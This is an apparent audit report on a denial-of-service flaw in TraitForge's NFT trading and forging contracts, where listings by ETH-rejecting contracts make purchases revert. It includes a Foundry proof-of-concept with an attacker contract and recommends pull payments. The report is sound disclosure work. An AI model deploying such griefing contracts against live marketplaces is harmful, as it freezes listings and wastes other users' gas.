# Vulnerability details

## Description
The issue arises when an NFT is listed for sale in `EntityTrading::listNFTForSale()` or listed for forging in `EntityForging::listForForging()` functions  by a contract that is unable to receive ETH, either due to lacking a `receive()` or `fallback()` function, or by intentionally reverting ETH transfers. And then someone try to buy nft or forge with that listed nft  in `EntityTrading::buyNFT` function or `EntityForging::forgeWithListed` lead to these function pay a owner of that listed nft which is a contract address that is unable to receive ETH and then lead to Dos.

## Impact:

1. **Blocked Purchases and forging**: Any attempt to purchase an NFT listed by a non-receiving contract will invariably fail. This renders affected NFTs impossible to buy, despite being listed for sale.

2. **Frozen Listings and Potential for Malicious Exploitation**: Since the purchase transaction reverts, the listing cannot be removed through the normal purchase process. This results in permanent, unfulfillable listings cluttering the marketplace. And a malicious actor could intentionally list multiple NFTs using contracts designed to reject ETH, effectively spamming the marketplace with unbuyable items.

3. **Secondary Function Disruption**: Functions that iterate over or process all listings (e.g., for displaying available NFTs) may experience increased gas costs or potential failures due to the presence of these unmovable listings.

4. **User Experience Degradation and Trust Issue**: Legitimate users attempting to purchase these NFTs will face failed transactions, potentially leading to confusion and loss of gas fees. And Repeated failed purchases could erode user trust in the platform, especially if users are unaware of the underlying cause.


## Proof of Concept
PoC for `EntityTrading::buyNFT` only, `EntityForging::forgeWithListed` can be achieved  similarly.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {EntityTrading} from "../src/contracts/EntityTrading/EntityTrading.sol";
import {EntityForging} from "../src/contracts/EntityForging/EntityForging.sol";
import {DevFund} from "../src/contracts/DevFund/DevFund.sol";
import {NukeFund} from "../src/contracts/NukeFund/NukeFund.sol";
import {TraitForgeNft} from "../src/contracts/TraitForgeNft/TraitForgeNft.sol";
import {EntityTrading} from "../src/contracts/EntityTrading/EntityTrading.sol";
import {EntropyGenerator} from "../src/contracts/EntropyGenerator/EntropyGenerator.sol";
import {Airdrop} from "../src/contracts/Airdrop/Airdrop.sol";



contract EntityForgingTest is Test {
    EntityForging entityForging;
    TraitForgeNft traitForgeNft;
    EntropyGenerator entropyGenerator;
    Airdrop airdrop;
    DevFund devFund;
    NukeFund nukeFund;
    EntityTrading entityTrading;

    address ownerAddr = makeAddr("ownerAddr");
    address player1 = makeAddr("player1");
    address player2 = makeAddr("player2");

    function setUp() public {
        vm.startPrank(ownerAddr);

        // Deploy TraitForgeNft contract
        traitForgeNft = new TraitForgeNft();

        // Deploy Airdrop contract
        airdrop = new Airdrop();
        traitForgeNft.setAirdropContract(address(airdrop));
        airdrop.transferOwnership(address(traitForgeNft));

        // Deploy entropyGenerator contract
        entropyGenerator = new EntropyGenerator(address(traitForgeNft));
        entropyGenerator.writeEntropyBatch1();
        traitForgeNft.setEntropyGenerator(address(entropyGenerator));

        // Deploy EntityForging contract
        entityForging = new EntityForging(address(traitForgeNft));
        traitForgeNft.setEntityForgingContract(address(entityForging));

        devFund = new DevFund();
        nukeFund = new NukeFund(address(traitForgeNft), address(airdrop), payable(address(devFund)), payable(ownerAddr));
        traitForgeNft.setNukeFundContract(payable(address(nukeFund)));

        entityTrading = new EntityTrading(address(traitForgeNft));
        entityTrading.setNukeFundAddress(payable(address(nukeFund)));

        vm.stopPrank();

        vm.deal(player1, 10 ether);
        vm.deal(player2, 10 ether);

        // Used to avoid whitelist proof
        vm.warp(86402);
        vm.roll(86402);
    }

    function testDosForBuyingNft() public {
      uint tokenId = 1;
      vm.startPrank(player1);
      // Contract that mint, approve and list minted nft for sale but does not accept ETH
      Foo foo = new Foo{value: 1 ether}(traitForgeNft, entityTrading);
      vm.stopPrank();

      // player2 try to buy listed NFT but fail
      vm.startPrank(player2);
      vm.expectRevert('Failed to send to seller');
      entityTrading.buyNFT{value: 1e18}(tokenId);
    }
}

contract Foo {
    uint public tokenId = 1;
    constructor(TraitForgeNft traitForgeNft, EntityTrading entityTrading) payable{
        bytes32[] memory proof;
        traitForgeNft.mintToken{value: traitForgeNft.calculateMintPrice()}(proof);
        traitForgeNft.approve(address(entityTrading), tokenId);

        entityTrading.listNFTForSale(tokenId, 1e18);
    }
}
```

## Recommended Mitigation Steps
1. Implementing a pull payment pattern instead of pushing payments directly.
2. Checking if the seller is a contract and if it can receive ETH before creating a listing.
